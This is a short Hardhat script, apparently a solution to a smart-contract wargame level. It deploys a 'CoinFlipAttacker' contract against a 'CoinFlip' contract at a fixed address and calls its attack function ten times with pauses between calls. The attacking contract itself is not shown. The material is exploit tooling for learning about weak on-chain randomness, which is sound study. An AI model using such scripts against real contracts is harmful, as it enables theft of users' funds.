import { ethers } from "hardhat";

async function main() {
  const coinFlip = await ethers.getContractAt("CoinFlip", "0xD034CC63dfc5718143169460bF9bf14AFF6E3305");

  const Attacker = await ethers.getContractFactory("CoinFlipAttacker");
  const attacker = await Attacker.deploy(coinFlip.address);
  console.log("attacker deployed at", attacker.address);

  for (let k = 0; k < 10; k++) {
    const tx = await attacker.attack();
    await tx.wait(1);
    await new Promise((res) => setTimeout(() => res(true), 13000));
  }

  console.log("done!");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
